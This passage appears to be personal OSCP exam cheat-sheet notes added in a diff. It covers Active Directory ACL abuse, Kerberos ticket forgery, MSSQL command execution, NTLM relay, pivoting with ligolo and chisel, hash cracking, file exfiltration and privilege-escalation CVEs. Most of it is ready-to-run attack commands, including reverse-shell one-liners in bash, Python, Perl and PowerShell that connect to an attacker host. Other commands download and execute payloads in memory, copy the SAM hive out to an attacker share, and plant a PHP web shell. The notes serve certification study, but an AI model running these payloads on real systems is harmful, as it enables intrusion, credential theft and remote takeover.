+
+# GenericAll / GenericWrite on GROUP → add yourself
+Add-DomainGroupMember -Identity "Domain Admins" -Members stephanie
+
+# WriteDACL on Domain Object → grant yourself DCSync rights
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity stephanie -Rights DCSync
+# Then run secretsdump
+
+# WriteOwner → take ownership, then GenericAll
+Set-DomainObjectOwner -Identity target -OwnerIdentity stephanie
+Add-DomainObjectAcl -TargetIdentity target -PrincipalIdentity stephanie -Rights All
+
+# GenericAll on COMPUTER → RBCD
+impacket-addcomputer -computer-name 'ATTACKPC$' -computer-pass 'Atk123!' \
+  'corp.local/stephanie:Password123' -dc-ip 192.168.x.100
+impacket-rbcd -delegate-to TARGET$ -delegate-from ATTACKPC$ \
+  -dc-ip 192.168.x.100 -action write 'corp.local/stephanie:Password123'
+impacket-getST -spn cifs/$TARGET_FQDN -impersonate Administrator \
+  'corp.local/ATTACKPC$:Atk123!' -dc-ip 192.168.x.100
+export KRB5CCNAME=Administrator@cifs_${TARGET_FQDN}@CORP.LOCAL.ccache
+impacket-secretsdump -k -no-pass corp.local/Administrator@$TARGET_FQDN
+```
+
+#### Delegation (constrained / unconstrained)
+
+```bash
+# Constrained — S4U2self + S4U2proxy
+impacket-getST -spn cifs/$TARGET_FQDN -impersonate Administrator \
+  -dc-ip 192.168.x.100 corp.local/$DELEG_USER:'$DELEG_PASS'
+export KRB5CCNAME=Administrator@cifs_${TARGET_FQDN}@CORP.LOCAL.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@$TARGET_FQDN
+
+# Unconstrained — coerce DC auth → capture TGT
+# Step 1: on the unconstrained machine
+.\Rubeus.exe monitor /interval:5 /filteruser:DC$
+# Step 2: coerce (need a machine acct for PetitPotam usually)
+python3 PetitPotam.py -u stephanie -p 'Password123' UNCONS_IP DC_IP
+python3 printerbug.py corp.local/stephanie:'Password123'@DC_IP UNCONS_IP
+# Step 3: import the captured TGT → DCSync
+```
+
+### Phase 6 — Domain Dominance
+
+```bash
+# Golden ticket (need krbtgt hash + domain SID)
+impacket-lookupsid corp.local/user:'pass'@192.168.x.100 | grep "Domain SID"
+
+impacket-ticketer -nthash $KRBTGT_NTLM \
+  -domain-sid S-1-5-21-XXX-YYY-ZZZ \
+  -domain corp.local Administrator
+export KRB5CCNAME=Administrator.ccache
+impacket-psexec -k -no-pass corp.local/Administrator@$DC_FQDN
+
+# Silver ticket (single-service forgery)
+impacket-ticketer -nthash $SVC_NTLM -domain-sid S-1-5-21-XXX \
+  -domain corp.local -spn cifs/$TARGET_FQDN Administrator
+
+# Dump it all
+impacket-secretsdump corp.local/Administrator:'pass'@192.168.x.100 -just-dc
+impacket-secretsdump -hashes :$NTLM corp.local/Administrator@192.168.x.100 -just-dc
+```
+
+---
+
+## 7. MSSQL — RCE & LATERAL MOVEMENT
+
+### Connect
+
+```bash
+impacket-mssqlclient corp.local/sa@$IP -windows-auth
+impacket-mssqlclient sa@$IP                              # SQL auth
+impacket-mssqlclient corp.local/user:'pass'@$IP -windows-auth
+
+# Windows
+sqlcmd -S $IP -U sa -P password -Q "SELECT @@version"
+. .\PowerUpSQL.ps1
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+
+### Enumerate
+
+```sql
+SELECT @@version;
+SELECT SYSTEM_USER;
+SELECT USER_NAME();
+SELECT IS_SRVROLEMEMBER('sysadmin');                     -- 1 = sysadmin
+SELECT name FROM master.dbo.sysdatabases;
+SELECT name, type_desc FROM master.sys.server_principals;
+
+-- Who can I impersonate? (low-priv → SA path)
+SELECT DISTINCT b.name FROM sys.server_permissions a
+INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
+WHERE a.permission_name = 'IMPERSONATE';
+
+-- Linked servers (CRITICAL for OSCP)
+EXEC sp_linkedservers;
+SELECT srvname, srvproduct, isremote FROM master..sysservers;
+```
+
+### Enable xp_cmdshell (need sysadmin)
+
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'powershell -enc <B64>';
+```
+
+### Impersonation → sysadmin
+
+```sql
+EXECUTE AS LOGIN = 'sa';
+SELECT IS_SRVROLEMEMBER('sysadmin');                    -- 1 now
+-- Now enable xp_cmdshell and RCE
+REVERT;                                                 -- when done
+```
+
+### Linked-server lateral movement
+
+```sql
+-- Test linked-server execution
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS",
+  'SELECT @@version, @@servername, SYSTEM_USER');
+SELECT * FROM OPENQUERY("MS02\SQLEXPRESS",
+  'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
+
+-- Single-hop xp_cmdshell on linked server
+EXEC ('xp_cmdshell ''whoami''') AT [MS02\SQLEXPRESS];
+
+-- Enable xp_cmdshell on the link if needed
+EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [MS02\SQLEXPRESS];
+EXEC ('xp_cmdshell ''powershell -enc <B64>''') AT [MS02\SQLEXPRESS];
+
+-- Reverse shell across the link
+EXEC ('xp_cmdshell ''powershell -c "iwr http://LHOST/nc.exe -OutFile C:\Windows\Temp\nc.exe; C:\Windows\Temp\nc.exe LHOST 5555 -e cmd"''') AT [MS02\SQLEXPRESS];
+
+-- Double-hop (MS01 → MS02 → MS03)
+EXEC ('EXEC (''xp_cmdshell ''''whoami'''''') AT [MS03]') AT [MS02\SQLEXPRESS];
+```
+
+### UNC path → hash capture (no xp_cmdshell needed)
+
+```bash
+# Attacker
+sudo responder -I tun0 -wv
+```
+
+```sql
+-- Force MSSQL to auth to your SMB
+EXEC xp_dirtree '\\LHOST\share';
+EXEC xp_fileexist '\\LHOST\x';
+-- Via SQLi if web UI is your path in:
+-- '; EXEC xp_dirtree '\\LHOST\x'; --
+```
+
+```bash
+# Crack
+hashcat -m 5600 Responder/logs/SMB-NTLMv2-*.txt /usr/share/wordlists/rockyou.txt
+
+# Or NTLM relay (SMB signing off)
+nxc smb 10.10.10.0/24 --gen-relay-list unsigned.txt
+sudo impacket-ntlmrelayx -tf unsigned.txt -smb2support -socks
+```
+
+### Read/write files via MSSQL
+
+```sql
+-- Read
+SELECT * FROM OPENROWSET(BULK N'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) t;
+SELECT * FROM OPENROWSET(BULK N'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) t;
+
+-- Write a webshell (if path + perms cooperate)
+EXEC xp_cmdshell 'echo ^<?php system($_GET["c"]); ?^> > C:\inetpub\wwwroot\s.php';
+```
+
+### MSSQL decision tree
+
+```
+1433 found
+   │ try sa/blank, sa/sa, sa/password, sa/Password123, sa/hostname
+   ▼
+   IS_SRVROLEMEMBER('sysadmin')?
+       │
+   ┌───┴───┐
+  YES     NO
+   │       │
+   │   IMPERSONATE rights? → EXECUTE AS LOGIN='sa' → YES
+   │       │
+   ▼       ▼
+xp_cmdshell ON  →  RCE locally
+   │
+   ▼
+sp_linkedservers — anything linked?
+   │
+  YES → OPENQUERY → xp_cmdshell ON link → RCE on MS02/DC
+  NO  → xp_dirtree '\\LHOST\x' → Responder → crack or relay
+```
+
+---
+
+## 8. PIVOTING — LIGOLO-NG + CHISEL
+
+> **Pete's tool inventory (verified):**
+> - Chisel 1.11.5 — 4 binaries (linux/windows × amd64/386)
+> - Ligolo-ng 0.8.2 — proxy + agent-amd64.exe (no 32-bit ligolo exists)
+> - 32-bit Windows fallback = chisel-windows-386.exe
+
+### When to pivot
+
+```
+MS01 (reachable) needs to reach MS02 (internal subnet)
+ss -tlnp shows service on 127.0.0.1 only
+Found creds for an internal host
+DC is on another subnet
+```
+
+### Ligolo-ng (PRIMARY — gives you full network-layer access)
+
+```bash
+# === ATTACKER SIDE ===
+# (One-time per session) — create tun interface
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
+
+# Start proxy
+cd ~/oscp/tools/ligolo
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+# === TRANSFER AGENT TO VICTIM ===
+python3 -m http.server 80
+# Windows victim:
+certutil -urlcache -split -f http://LHOST/agent-amd64.exe agent.exe
+.\agent.exe -connect LHOST:11601 -ignore-cert
+# (32-bit Windows? Use chisel instead — ligolo doesn't ship 386)
+
+# === IN LIGOLO PROXY CONSOLE — EXACT ORDER MATTERS ===
+session                              # pick the agent number
+ifconfig                             # note victim's internal IPs/subnets
+start                                # activate tunnel
+
+# === ATTACKER — ADD ROUTE ===
+sudo ip route add 10.10.10.0/24 dev ligolo
+# Test:
+ping 10.10.10.50
+nmap -sV 10.10.10.50
+nxc smb 10.10.10.50 -u user -p pass
+evil-winrm -i 10.10.10.50 -u user -p pass
+
+# === EXPOSE VICTIM'S LOCAL PORT TO ATTACKER ===
+# In ligolo console:
+listener_add --addr 0.0.0.0:8080 --to 10.10.10.50:80 --tcp
+# Hit http://127.0.0.1:8080 on attacker
+
+# === DOUBLE PIVOT (MS01 → MS02 → MS03) ===
+# Need to land agent on MS02:
+# Use ligolo listener to relay agent port from MS01:
+listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
+# On MS02:
+.\agent.exe -connect MS01_IP:11601 -ignore-cert
+# New session appears in proxy console → start → add route
+sudo ip route add 172.16.0.0/24 dev ligolo
+```
+
+#### Ligolo correct setup order (memorize!)
+```
+1. tuntap interface created
+2. proxy started
+3. agent connects, session appears
+4. session command (select it)
+5. start command in proxy console
+6. ip route add on attacker
+```
+
+### Chisel (FALLBACK — when ligolo can't run, or 32-bit target)
+
+```bash
+# Reverse SOCKS — most common chisel use
+# Attacker:
+./chisel-linux server -p 8888 --reverse
+# Victim (Windows):
+.\chisel-windows.exe client LHOST:8888 R:1080:socks
+# 32-bit Windows victim:
+.\chisel-windows-386.exe client LHOST:8888 R:1080:socks
+
+# Configure proxychains
+sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
+proxychains nmap -sT -Pn 10.10.10.50
+proxychains nxc smb 10.10.10.50 -u user -p pass
+proxychains evil-winrm -i 10.10.10.50 -u user -p pass
+# Note: nmap through proxychains MUST use -sT (TCP connect)
+
+# Specific port forward (faster than SOCKS for single port)
+.\chisel-windows.exe client LHOST:8888 R:3306:127.0.0.1:3306
+# Now attacker's 127.0.0.1:3306 = victim's local MySQL
+```
+
+### SSH tunneling (when SSH is available)
+
+```bash
+# Local port forward — reach internal port locally
+ssh -L 3389:10.10.10.50:3389 user@MS01
+xfreerdp /v:localhost:3389 /u:admin /p:pass
+
+# Dynamic SOCKS — reach internal network
+ssh -D 1080 -N user@MS01
+# /etc/proxychains4.conf → socks5 127.0.0.1 1080
+proxychains nmap -sT -Pn 10.10.10.0/24
+
+# Reverse tunnel — victim brings the connection out
+# On victim:
+ssh -R 4444:127.0.0.1:4444 attacker@LHOST
+```
+
+### Plink (Windows where no SSH available)
+
+```cmd
+certutil -urlcache -split -f http://LHOST/plink.exe plink.exe
+cmd /c echo y | .\plink.exe -ssh -l root -pw 'pass' -R 127.0.0.1:4455:127.0.0.1:445 LHOST
+```
+
+---
+
+## 9. PASSWORD ATTACKS & HASHES
+
+### Hash identification
+
+```bash
+hashid '<HASH>'
+# Online: hashes.com/en/tools/hash_identifier
+
+# Cheatsheet by prefix/shape:
+# $1$....           MD5crypt        -m 500
+# $2y$ / $2a$       bcrypt          -m 3200
+# $5$....           SHA256crypt     -m 7400
+# $6$....           SHA512crypt     -m 1800   (Linux /etc/shadow)
+# 32 hex chars      MD5 or NTLM     -m 0 / -m 1000
+# AAD3B435...HASH   NTLM SAM dump   -m 1000   (second half is the NT)
+# $krb5asrep$...    AS-REP          -m 18200
+# $krb5tgs$23$...   Kerberoast      -m 13100
+```
+
+### Hashcat modes — the ones you'll actually use
+
+```
+   0  MD5
+ 100  SHA1
+1000  NTLM (Windows local + SAM)
+1800  SHA512crypt (Linux /etc/shadow $6$)
+ 500  MD5crypt (Linux /etc/shadow $1$)
+3200  bcrypt
+5500  NetNTLMv1
+5600  NetNTLMv2 (Responder captures)
+13100 Kerberoast (TGS-REP)
+18200 AS-REP roast
+```
+
+### Hashcat command patterns
+
+```bash
+hashcat -m 1000  ntlm.txt   rockyou.txt
+hashcat -m 5600  netntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13100 kerb.txt   rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
+hashcat -m 18200 asrep.txt  rockyou.txt
+hashcat -m 1800  shadow.txt rockyou.txt
+hashcat -m 22000 wifi.hc22000 rockyou.txt
+
+# Mask attack (when you know the structure)
+hashcat -m 1000 ntlm.txt -a 3 'Spring?d?d?d?d!'      # Spring2026!
+
+# Show cracked
+hashcat -m 1000 ntlm.txt --show
+
+# Combinator (two wordlists)
+hashcat -m 1000 ntlm.txt -a 1 names.txt years.txt
+```
+
+### Custom wordlists
+
+```bash
+# Scrape target site for words
+cewl http://$IP -m 5 -d 3 -w cewl.txt
+cewl http://$IP -m 5 -d 3 --with-numbers -w cewl_nums.txt
+
+# Username generation from a full name "John Smith"
+# Generate every combo:
+echo -e "john\nsmith\njsmith\nj.smith\njohnsmith\njohn.smith\nJ.Smith\nSmithJ" > users.txt
+
+# Mutate via rules
+hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > mutated.txt
+```
+
+### Online brute force
+
+```bash
+hydra -l root  -P rockyou.txt ssh://$IP -t 4 -V
+hydra -l admin -P rockyou.txt $IP http-post-form \
+  "/login.php:user=^USER^&pass=^PASS^:F=invalid"
+hydra -L users.txt -P rockyou.txt ftp://$IP -t 10
+hydra -l sa -P rockyou.txt mssql://$IP
+crowbar -b rdp -s $IP/32 -u administrator -C rockyou.txt
+
+nxc smb   $IP -u users.txt -p rockyou.txt --no-bruteforce       # one P per U
+nxc winrm $IP -u users.txt -p rockyou.txt
+nxc ssh   $IP -u users.txt -p rockyou.txt
+```
+
+### NTLM capture & relay
+
+```bash
+# Capture
+sudo responder -I tun0 -wv
+# Crack NetNTLMv2
+hashcat -m 5600 Responder/logs/SMB-NTLMv2-*.txt rockyou.txt
+
+# Relay (target must have SMB signing OFF — check first!)
+nxc smb 10.10.10.0/24 --gen-relay-list unsigned.txt
+# Disable Responder SMB/HTTP in /etc/responder/Responder.conf first
+sudo impacket-ntlmrelayx -tf unsigned.txt -smb2support             # dump SAM
+sudo impacket-ntlmrelayx -tf unsigned.txt -smb2support -socks      # SOCKS sessions
+sudo impacket-ntlmrelayx -tf unsigned.txt -smb2support -i          # interactive
+```
+
+> **Pete's MAILSRV1 workflow reminder** (Assembling the Pieces):
+> 1. `sudo responder -I eth0 -wv` (eth0 = 10.13.77.50)
+> 2. Submit contact form on WEBSRV1 with `\\10.13.77.50\test`
+> 3. Capture NTLMv2 → crack OR relay → DCSync `BEYOND\Administrator` (hash starts `848`)
+
+---
+
+## 10. FILE TRANSFERS
+
+### Linux → Windows (download to victim)
+
+```powershell
+# PowerShell — IEX in memory (best, no disk)
+IEX(New-Object Net.WebClient).DownloadString('http://LHOST/shell.ps1')
+
+# DownloadFile to disk
+(New-Object Net.WebClient).DownloadFile('http://LHOST/file.exe','C:\Temp\file.exe')
+iwr http://LHOST/file.exe -OutFile C:\Temp\file.exe
+
+# Certutil
+certutil -urlcache -split -f http://LHOST/file.exe C:\Temp\file.exe
+
+# BITS (least suspicious to AV)
+bitsadmin /transfer j /download /priority normal http://LHOST/file.exe C:\Temp\file.exe
+
+# SMB (Impacket server)
+# Attacker:
+impacket-smbserver share . -smb2support
+# Or with auth:
+impacket-smbserver share . -smb2support -username pete -password 1337
+# Victim:
+copy \\LHOST\share\file.exe C:\Temp\
+
+# Newer Windows: native curl/wget
+curl http://LHOST/file.exe -o C:\Temp\file.exe
+```
+
+### Windows → Linux (exfil)
+
+```powershell
+# SMB upload back
+copy C:\Windows\System32\config\SAM \\LHOST\share\SAM
+
+# HTTP POST (attacker: pip install uploadserver; python3 -m uploadserver)
+Invoke-WebRequest -Uri http://LHOST/upload -Method POST `
+  -InFile C:\loot\dump.zip -ContentType "application/octet-stream"
+
+# Base64 copy/paste (small files)
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\file.txt"))
+# Decode on attacker:
+echo '<B64>' | base64 -d > file.txt
+
+# Netcat
+# Attacker:  nc -lvnp 9001 > file.exe
+# Victim:    nc.exe LHOST 9001 < C:\file.exe
+```
+
+### Linux → Linux
+
+```bash
+# HTTP
+python3 -m http.server 80
+curl http://LHOST/file -o file
+wget http://LHOST/file
+
+# SCP
+scp file user@$IP:/tmp/
+
+# Netcat
+# Receiver: nc -lvnp 4444 > file
+# Sender:   nc LHOST 4444 < file
+
+# Base64 inline
+base64 -w0 file.bin                # encode
+echo '<B64>' | base64 -d > file.bin
+
+# Even simpler — paste via tee
+cat > /tmp/script.sh <<'EOF'
+... paste contents ...
+EOF
+```
+
+---
+
+## 11. SHELLS & TTY UPGRADES
+
+### Reverse shell one-liners
+
+#### Linux (run on victim)
+
+```bash
+# Bash (no extra binaries)
+bash -i >& /dev/tcp/LHOST/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
+
+# Bash via /dev/tcp + read (when above blocked)
+0<&196;exec 196<>/dev/tcp/LHOST/4444; sh <&196 >&196 2>&196
+
+# Python (most reliable)
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("LHOST",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+
+# Perl
+perl -e 'use Socket;$i="LHOST";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# nc with -e
+nc -e /bin/bash LHOST 4444
+# nc without -e (busybox/old)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST 4444 >/tmp/f
+
+# PHP
+php -r '$sock=fsockopen("LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Ruby
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("LHOST","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+```
+
+#### Windows (run on victim)
+
+```powershell
+# PowerShell (Nishang-style)
+powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('LHOST',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$rs=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($rs);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
+
+# Base64-encoded (avoid quote escaping)
+$cmd = 'powershell -nop -c "..."'
+[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+# Then: powershell -e <BASE64>
+
+# nc.exe (transfer first)
+nc.exe LHOST 4444 -e cmd.exe
+
+# msfvenom standard
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f exe -o s.exe
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f aspx -o s.aspx
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f war  -o s.war
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f msi  -o s.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f dll  -o s.dll
+
+# Better: shellcode in C# loader (less AV pain)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=4444 -f csharp
+```
+
+### Linux TTY upgrade (memorize the sequence)
+
+```bash
+# Step 1
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# Step 2: Ctrl-Z
+stty raw -echo; fg
+# Press Enter
+export TERM=xterm
+export SHELL=/bin/bash
+# Step 3: match your terminal exactly
+stty rows 48 columns 190         # adjust to your actual `stty size`
+
+# Alternatives if python missing
+script -qc /bin/bash /dev/null   # then same Ctrl-Z dance
+socat                            # best quality if available
+# Attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:4444
+```
+
+### Listeners
+
+```bash
+nc -lvnp 4444                                          # basic
+rlwrap nc -lvnp 4444                                   # arrow keys + history
+pwncat-cs -lp 4444                                     # auto-upgrades TTY for you!
+
+# Metasploit handler (your 1 allowed Metasploit box)
+msfconsole -q -x "use multi/handler; \
+  set payload windows/x64/shell_reverse_tcp; \
+  set LHOST tun0; set LPORT 4444; \
+  set ExitOnSession false; run -j"
+```
+
+---
+
+## 12. HIGH-VALUE CVEs
+
+```
+CVE/NAME              TARGET                       IMPACT       NOTES
+─────────────────────────────────────────────────────────────────────
+MS17-010 EternalBlue  Win7/2008R2 SMBv1            → SYSTEM     nmap smb-vuln-ms17-010
+MS08-067              WinXP/2003                    → SYSTEM     msf ms08_067
+BlueKeep (2019-0708)  Win7/2008 RDP                 → SYSTEM     unstable; reboot risk
+PrintNightmare        Win10/2019 (older patches)    → SYSTEM     SharpPrintNightmare
+ZeroLogon (2020-1472) DC (unpatched)                → DA         instant DA — rare on exam
+NoPac (2021-42278)    DC (unpatched)                → DA         noPac.py
+PetitPotam            unpatched DC + ADCS           → DA via relay
+
+Apache 2.4.49 (41773) Path traversal                → RCE        cgi-bin/.%2e/.%2e/...
+Apache 2.4.50 (42013) Bypass of above                → RCE
+
+PwnKit (2021-4034)    Linux pkexec (universal)      → root       go-to local privesc
+DirtyPipe (2022-0847) kernel 5.8–5.16.11            → root
+DirtyCow (2016-5195)  kernel <4.8.3                 → root
+Baron Samedit         sudo <1.9.5p2                  → root
+
+Log4Shell (2021-44228) Log4j 2.x                    → RCE        ${jndi:ldap://LHOST/x} in any header
+Tomcat /manager       weak creds                    → RCE        WAR upload
+Jenkins /script       weak creds / unauth           → RCE        Groovy console
+
+Shellshock (2014-6271) old bash CGI                 → RCE        () { :;}; /bin/bash -c '...'
+Drupalgeddon2 (2018-7600) Drupal 7/8                → RCE        drupwn / metasploit
+```
+
+### Quick searchsploit workflow
+
+```bash
+searchsploit apache 2.4
+searchsploit "wordpress 5.7"
+searchsploit -m 47837                          # copy exploit locally
+searchsploit -x 47837                          # examine
+searchsploit -u                                # update DB
+searchsploit --os linux --type local
+```
+
+---
+
+## 13. PROOF COLLECTION FORMAT
+
+> **Every flag screenshot must show: flag content + whoami + hostname + IP**
+
+### Exact commands
+
+```bash
+# Linux — user (local.txt)
+cat /home/$(whoami)/local.txt; whoami; id; hostname; ip a | grep inet
+
+# Linux — root (proof.txt)
+cat /root/proof.txt; whoami; id; hostname; ip a | grep inet
+```
+
+```cmd
+:: Windows — user
+type C:\Users\%USERNAME%\Desktop\local.txt & whoami & hostname & ipconfig
+
+:: Windows — admin/SYSTEM
+type C:\Users\Administrator\Desktop\proof.txt & whoami & hostname & ipconfig /all
+:: If SYSTEM, also:
+whoami /priv
+
+:: DC proof.txt (Domain Admin)
+type C:\Users\Administrator\Desktop\proof.txt & whoami & net group "Domain Admins" /domain & hostname & ipconfig
+```
+
+### Where to look if flags aren't on the Desktop
+
+```bash
+# Linux
+find / -name "local.txt" -o -name "proof.txt" 2>/dev/null
+find / -type f -name "*.txt" 2>/dev/null | xargs grep -l "OS{" 2>/dev/null
+```
+
+```cmd
+:: Windows
+dir /s /b C:\ 2>nul | findstr /i "local.txt proof.txt"
+dir /s /b C:\Users 2>nul | findstr /i ".txt"
+```
+
+### Point tracker (fill in as you go)
+
+```
+[ ] AD MS01 — local.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] AD MS02 — local.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] AD DC   — proof.txt — 20 pts  | flag: _______________ | screenshot ☐
+[ ] Box1    — local.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] Box1    — proof.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] Box2    — local.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] Box2    — proof.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] Box3    — local.txt — 10 pts  | flag: _______________ | screenshot ☐
+[ ] Box3    — proof.txt — 10 pts  | flag: _______________ | screenshot ☐
+                                  TOTAL: ____ / 100   (need 70)
+```
+
+### Pre-submission checklist
+- ☐ Every flag screenshot shows whoami + hostname + IP
+- ☐ Detailed notes for each attack path (you have 24h after exam to write report)
+- ☐ Commands copied to notes for report appendix
+- ☐ Metasploit used on ≤ 1 machine
+- ☐ Report template open and partially filled
+
+---
+
+## 14. STUCK? RESET CHECKLIST
+
+> **Rule: 45 minutes max on any single vector. Then STOP and run this list.**
+
+```
+☐  1. Full TCP scan done? (-p- not just top 1000)
+☐  2. UDP top 100 done? (SNMP, TFTP, IKE often pivotal)
+☐  3. View-source on every web page — comments with creds?
+☐  4. robots.txt, sitemap.xml, /.git, /.env, /backup, /admin?
+☐  5. Tried every found credential against every service?
+☐  6. Default creds: admin:admin, admin:password, sa:sa, tomcat:tomcat?
+☐  7. Service version → exact CVE search done?
+☐  8. searchsploit for each service+version?
+☐  9. Every SMB share enumerated AND downloaded?
+☐ 10. SQLi tested on every input?
+☐ 11. LFI tested on every file/page/include parameter?
+☐ 12. linpeas/winpeas output FULLY read — yellow/red?
+☐ 13. sudo -l, SUID, capabilities, cron all checked?
+☐ 14. .bak, .old, .conf, history files searched?
+☐ 15. Am I overthinking this — is there a simpler path?
+
+If still stuck after this: switch to a different box, come back later.
+```
+
+### AD-specific stuck-checklist
+
+```
+☐ Re-read description fields on EVERY user (LDAP)
+☐ Did you check SYSVOL (cpassword)?
+☐ AS-REP roast covered ALL users (not just one)?
+☐ BloodHound — "shortest path" from your owned user → DA?
+☐ Did you check ACLs on Domain Object itself?
+☐ MSSQL anywhere? Linked servers checked?
+☐ Re-run BloodHound after pwning MS01 (extra data inside)
+☐ Password reuse — found pass on MS01? Try domain-wide
+```
+
+---
+
+## 15. RABBIT HOLES TO AVOID
+
+```
+✗ Kernel exploits before checking sudo/SUID/cron
+✗ Brute-forcing SSH with rockyou (10M = too slow, you'll burn hours)
+✗ Skipping UDP entirely (SNMP public = often creds/usernames)
+✗ Not re-using found creds against every other service
+✗ Fuzzing for hours when the page has no dynamic params
+✗ Spending >45 min on one attack vector without switching
+✗ Assuming no MSSQL linked servers — always sp_linkedservers
+✗ Forgetting ConsoleHost_history.txt
+✗ Not checking web.config / app.config / .env files
+✗ Giving up on a SUID without trying GTFObins for it
+✗ Using Metasploit on more than 1 machine (instant zero on those boxes)
+✗ Wasting time on AV evasion — it's a CTF, not a red team
+```
+
+---
+
+## APPENDIX: Pete's Tool Inventory
+
+```
+~/oscp/tools/
+├── chisel/                  (1.11.5 — verified)
+│   ├── chisel-linux         (amd64)
+│   ├── chisel-linux-386
+│   ├── chisel-windows.exe   (amd64)
+│   └── chisel-windows-386.exe
+├── ligolo/                  (0.8.2 — verified, x64 only)
+│   ├── proxy
+│   └── agent-amd64.exe
+├── PEAS/                    (linpeas.sh, winPEAS*.{exe,ps1,bat})
+├── PowerSploit/             (also at /usr/share/windows-resources/powersploit/)
+├── impacket/                (apt-get installed: impacket-* tools)
+├── BloodHound/              (BloodHound GUI + bloodhound-python)
+└── Rubeus/                  (Rubeus.exe)
+```
+
+### Verify night-before-exam
+```bash
+./chisel-linux --version                       # 1.11.5
+./proxy -version                               # 0.8.2 (ligolo)
+nxc --version
+evil-winrm --help | head -1
+which impacket-secretsdump impacket-psexec impacket-GetNPUsers
+ls /usr/share/wordlists/rockyou.txt
+```
+
+---
+
